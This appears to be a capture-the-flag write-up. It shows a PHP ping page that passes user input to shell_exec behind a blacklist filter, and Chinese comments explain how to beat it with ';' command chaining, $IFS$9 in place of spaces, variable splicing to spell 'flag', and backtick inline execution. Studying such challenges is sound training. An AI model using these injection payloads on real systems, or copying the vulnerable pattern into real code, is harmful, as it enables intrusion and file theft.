
/?ip=
<pre>PING 127.0.0.1 (127.0.0.1): 56 data bytes
/?ip=

<?php
if (isset($_GET['ip'])) {
    $ip = $_GET['ip'];
    if (preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{1f}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)) {
        echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
        die("fxck your symbol!");
    } else if (preg_match("/ /", $ip)) {
        die("fxck your space!");
    } else if (preg_match("/bash/", $ip)) {
        die("fxck your bash!");
    } else if (preg_match("/.*f.*l.*a.*g.*/", $ip)) {
        die("fxck your flag!");
    }
    $a = shell_exec("ping -c 4 " . $ip);
    echo "<pre>";
    print_r($a);
    
}
/**
 *  知识点：shell_exec()执行命令，可以使用【;】分号来执行多个命令
 *  测试方法：
 *          因为页面上显示传入的参数名称为：ip
 *          故可以尝试：ip=127.0.0.1
 *          在因为可以使用【;】执行多条命令
 *          故可以尝试：ip=127.0.0.1;ls     也可以是：ip=;ls    直接结束上一条命令
 *              会输出：index.php、flag.php 这两个文件
 *              然后可以读取index.php文件
 *              但是题目过滤掉了空格：绕过空格过滤使用：$IFS$9
 *          故可以尝试：ip=;cat$IFS$9index.php
 *              得到题目源码
 *          根据源码得出playload
 *              ip=;a=ag;b=fl;cat$IFS$9$b$a.php
 *          因为可以执行多条命令，那么就可以设置变量
 *          因为题目也就对单个字符进行了过滤，通过两两组合通过正则
 * 
 *      解法二：linux内联执行
 *          在linux系统中，反引号是作为内联执行，输出查询结果的内容。
 *          比如用ls查询出index.php。那么`ls`就代表了index.php这个文件
 *          如果存在多个文件那么就代表这多个文件，使用cat命令去读，会读所有的文件
 *          ip=;ls
 *          ip=cat$IFS$9`ls`
 */
